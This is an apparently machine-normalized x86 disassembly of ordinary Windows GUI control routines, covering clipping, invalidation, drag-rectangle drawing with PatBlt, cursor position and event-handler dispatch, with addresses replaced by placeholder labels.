mov eax [ ebp - 0x4 ]
mov edx esi
call sub_4044b8
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f8e0
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
mov eax esi
call sub_40456c
mov edx eax
mov eax ebx
call sub_44f830
sub_44f904
push ebx
mov ebx eax
mov [ ebx + 0x59 ] 0x0
mov [ ebx + 0x56 ] 0x0
mov eax [ ebx + 0x68 ]
call sub_4245d4
cmp eax [ ebx + 0x84 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb00e
mov eax ebx
call sub_450a20
pop ebx
retn
or [ ebx + 0x98 ] 0x10
mov eax [ ebx + 0x68 ]
call sub_4245d4
mov [ ebx + 0x84 ] eax
sub_44fa8c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_44fa7c
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor eax eax
call sub_44ca24
mov eax esi
call sub_44ca24
jmp r-xdata
sub_44fac4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x198 ]
mov edx ebx
call sub_418a0c
test eax eax
jl r-xdata
mov edx [ ebx + 0x30 ]
mov edi [ edx + 0x198 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_4188a0
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x198 ]
mov ecx ebx
mov edx esi
call sub_418a2c
mov cl 0x1
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_44fc9c
mov eax ebx
call sub_466790
test [ eax + 0x54 ] 0x4
je r-xdata
mov dl 0x1
mov si 0xffd1
call sub_4034ac
sub_44fb44
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
retn
test dl dl
je r-xdata
xor edx edx
call sub_44fac4
mov edx [ ecx + 0x198 ]
mov edx [ edx + 0x8 ]
dec edx
call sub_44fac4
jmp r-xdata
sub_44fb68
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_44fbfe
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
push 0x0
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push esi
call SetViewportOrgEx
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fc05
lea eax [ ebp - 0xc ]
call sub_4040ac
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb18
call sub_403a64
sub_44fc10
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edi [ eax + 0x198 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax edi
call sub_418a0c
mov esi eax
test esi esi
jle r-xdata
mov [ ebp - 0x1 ] 0x0
dec esi
mov edx esi
mov eax edi
call sub_4189b0
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test esi esi
jg r-xdata
test [ ebx + 0x50 ] 0x40
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_44f1f4
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call IntersectRect
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call EqualRect
test eax eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44fc9c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x15 ] cl
mov ebx edx
mov [ ebp - 0x4 ] eax
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_456358
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_44f1f4
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test [ eax + 0x50 ] 0x40
jne r-xdata
neg al
sbb eax eax
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_456054
push eax
call InvalidateRect
push ebp
call sub_44fc10
pop ecx
test al al
je r-xdata
mov al 0x1
sub_44fd38
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_466768
mov esi eax
test esi esi
je r-xdata
mov eax [ edi + 0x8 ]
push eax
mov ecx [ edi + 0x4 ]
mov edx 0xb043
mov eax ebx
call sub_450a20
mov [ edi + 0xc ] eax
cmp ebx esi
je r-xdata
mov edx edi
mov eax esi
mov si 0xffc9
call sub_4034ac
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44fd9c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_456358
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_456054
push eax
call GetDC
mov [ ebp - 0x8 ] eax
xor ecx ecx
push ebp
push sub_44fe75
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x44 ]
mov ecx edx
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x4c ]
push ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov ecx eax
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x48 ]
push ecx
push edx
push eax
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_453e60
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_456054
push eax
call ReleaseDC
retn
sub_44ff14
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx edx
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov eax edi
call sub_450a54
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi + 0x9b ] 0x1
je r-xdata
xor eax eax
mov [ rw-data ] eax
test [ edi + 0x54 ] 0x1
je r-xdata
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb98
call sub_403a64
test esi esi
jge r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_44f398
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406cf0
push eax
xor ecx ecx
mov edx 0x202
mov eax edi
call sub_450a20
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
mov ecx esi
mov edx ebx
mov eax edi
call sub_44dba4
sub_44ffe8
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] 0x0
cmp [ eax + 0xf2 ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0xc
mov [ esi ] 0x1
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
push esi
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xf4 ]
call [ ebx + 0xf0 ]
sub_450024
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xea ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_450070
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x11a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
sub_45009c
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx edx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_44f7f8
mov edi eax
mov eax [ ebx + 0x38 ]
call sub_44f7e4
mov ebp eax
mov [ esp + 0x10 ] edi
fild [ esp + 0x10 ]
fmul [ ebx + 0x20 ]
fild [ ebx + 0xc ]
fsubrp st1
fstp [ esp ]
fwait
mov [ esp + 0x10 ] ebp
fild [ esp + 0x10 ]
fmul [ ebx + 0x28 ]
fild [ ebx + 0x10 ]
fsubrp st1
fstp [ esp + 0x8 ]
fwait
lea esi [ ebx + 0x44 ]
fld [ esp ]
call sub_402abc
mov [ esi ] eax
fld [ esp + 0x8 ]
call sub_402abc
mov [ esi + 0x4 ] eax
add edi [ esi ]
mov [ esi + 0x8 ] edi
add ebp [ esi + 0x4 ]
mov [ esi + 0xc ] ebp
lea edx [ ebx + 0x44 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x4 ]
call sub_456054
push eax
call GetWindowRect
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov dl [ ebx + 0x54 ]
push edx
lea edx [ ebx + 0x44 ]
push edx
mov eax [ eax + 0x17c ]
mov ecx [ ebx + 0x58 ]
mov edx [ ebx + 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
sub_450180
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x10a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
sub_4501cc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov [ ebp - 0xa ] 0x0
cmp [ ebx + 0x13a ] 0x0
je r-xdata
cmp [ ebp - 0xa ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0xa ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
mov al [ ebp - 0xa ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx + 0xa4 ] esi
jmp r-xdata
mov ecx [ ebx + 0xa4 ]
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jge r-xdata
test ecx ecx
setl al
mov ecx eax
mov eax [ ebx + 0xa4 ]
cdq
xor eax edx
sub eax edx
mov esi eax
sub esi 0x78
mov [ ebx + 0xa4 ] esi
test cl cl
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe0
call sub_4034ac
mov [ ebp - 0xa ] al
test esi esi
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe1
call sub_4034ac
mov [ ebp - 0xa ] al
jmp r-xdata
neg esi
mov [ ebx + 0xa4 ] esi
sub_450290
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x142 ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x144 ]
call [ ebx + 0x140 ]
sub_4502dc
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x14a ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
sub_450328
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push esi
add esi 0x44
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
add esi 0x5c
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
call GetDesktopWindow
mov [ ebp - 0x8 ] eax
push 0x402
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call GetDCEx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_450443
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x40 ]
call sub_424bf4
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
sub eax esi
sub eax ebx
push eax
mov edi [ ebp - 0x1c ]
push edi
mov eax esi
add eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax edi
sub eax ebx
push eax
push ebx
mov eax edi
add eax ebx
push eax
mov eax [ ebp - 0x18 ]
sub eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
sub eax ebx
push eax
mov eax [ ebp - 0x14 ]
sub eax ebx
push eax
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
sub eax ebx
push eax
push ebx
push edi
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45044a
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ReleaseDC
retn
sub_45047c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi edx
mov [ esp ] eax
mov ebp [ edi + 0x8 ]
mov esi [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x5 ]
mov edx ebp
mov eax [ esp ]
call sub_44f398
mov al [ edi + 0x4 ]
sub al 0x3
jb r-xdata
test bl bl
jne r-xdata
mov [ esp + 0x4 ] 0x1
test bl bl
je r-xdata
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403460
mov esi [ eax + 0x38 ]
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ esp + 0xc ]
mov si 0xffde
call sub_4034ac
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffc4
call sub_4034ac
jmp r-xdata
test bl bl
je r-xdata
jmp r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al [ esp + 0x4 ]
mov [ edi + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ esp + 0x4 ]
mov si 0xffcb
call sub_4034ac
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffb7
call sub_4034ac
jmp r-xdata
sub_45056c
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
cmp edi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_417330
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax ebx
call sub_450a54
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax ebx
call sub_44f7e4
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax ebx
call sub_44f7f8
mov ecx eax
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
call sub_417380
lea esi [ ebp - 0x34 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_45074c
mov [ ebp - 0x5 ] al
jmp r-xdata
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x1c ]
mov eax esi
call sub_44f36c
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebx + 0xa0 ]
mov ecx ebx
mov edx edi
mov si 0xffbe
call sub_4034ac
test al al
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x1c ]
mov eax [ eax + 0x17c ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x14 ]
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0xa0 ]
call sub_456054
push eax
call MapWindowPoints
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44cf68
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_450737
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
xor esi esi
call sub_456054
mov esi eax
jmp r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x4 ] edi
mov eax [ ebp - 0xc ]
mov dl [ ebp + 0x8 ]
mov [ eax + 0x54 ] dl
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x58 ] edx
mov eax [ ebp - 0xc ]
push edi
lea edi [ eax + 0x44 ]
lea esi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
push 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_456054
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
mov si 0xffb7
call sub_4034ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4032b0
retn
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
push esi
call MapWindowPoints
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_44f1f4
test esi esi
je r-xdata
sub_45074c
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi eax
mov ebx [ edi + 0xa0 ]
test ebx ebx
je r-xdata
mov al 0x1
mov ecx edi
xor edx edx
mov eax ebx
mov si 0xffbe
call sub_4034ac
test al al
jne r-xdata
mov eax ebx
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov edx esp
mov eax edi
call sub_4515d0
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx esp
mov edx esi
mov eax edi
mov si 0xffcc
call sub_4034ac
mov eax esi
call sub_44f29c
push eax
lea eax [ esp + 0x14 ]
push eax
mov eax esi
call sub_44f258
mov ecx eax
xor edx edx
xor eax eax
call sub_417358
lea ecx [ esp + 0x10 ]
mov edx esi
mov eax edi
mov si 0xffcc
call sub_4034ac
jmp r-xdata
mov ebx eax
test bl bl
je r-xdata
sub_4507f0
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_450820
push ebx
push esi
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
cmp [ esi + 0x5b ] 0x5
je r-xdata
mov al 0x1
mov eax [ esp ]
mov eax [ eax ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
mov dl [ esi + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
mov ecx [ esp ]
mov ebx [ esp + 0x8 ]
mov [ ecx ] ebx
add cl 0xfd
sub cl 0x2
jae r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
mov [ edx ] ecx
jmp r-xdata
sub dl 0x3
jae r-xdata
sub_45088c
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ecx [ esp ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x30 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_45094c
sub_4508bc
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_4508ec
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push ebx
call GetCursorPos
mov ecx esp
mov edx ebx
mov eax esi
call sub_44f398
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
pop ecx
pop edx
pop esi
pop ebx
retn
sub_450918
push esi
test [ eax + 0x50 ] 0x4
je r-xdata
xor eax eax
pop esi
retn
mov esi [ edx ]
cmp esi 0x204
je r-xdata
mov al 0x1
pop esi
retn
cmp esi 0x205
je r-xdata
cmp esi 0x200
je r-xdata
cmp esi 0x206
je r-xdata
sub_45094c
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi ecx
mov esi edx
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x14 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp ] edx
mov [ esp ] edx
jmp r-xdata
xor edx edx
mov [ esp + 0x4 ] edx
mov [ esp + 0x4 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x10 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov [ esp + 0x8 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0xc ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0xc ] edx
mov [ esp + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x8 ]
test edx edx
jbe r-xdata
cmp [ esp ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp + 0x8 ]
jle r-xdata
lea edx [ esp + 0x8 ]
push edx
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp [ esp + 0x8 ] 0x0
jle r-xdata
cmp [ esp + 0xc ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp ]
jge r-xdata
mov eax [ esp + 0x8 ]
mov [ esi ] eax
jmp r-xdata
cmp [ esp + 0x4 ] 0x0
jle r-xdata
mov eax [ edi ]
cmp eax [ esp + 0xc ]
jle r-xdata
mov eax [ esp ]
mov [ esi ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ esp + 0x4 ]
jge r-xdata
mov eax [ esp + 0xc ]
mov [ edi ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ edi ] eax
sub_450a20
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x10 ]
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_450a54
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xac ] eax
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xa8 ] eax
pop ebx
retn
pop ebx
retn
cmp [ ebx + 0x9c ] 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xb4 ] eax
jmp r-xdata
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp [ ebx + 0x9c ] 0x1
je r-xdata
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xb0 ] eax
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
sub_450aec
push ebp
mov ebp esp
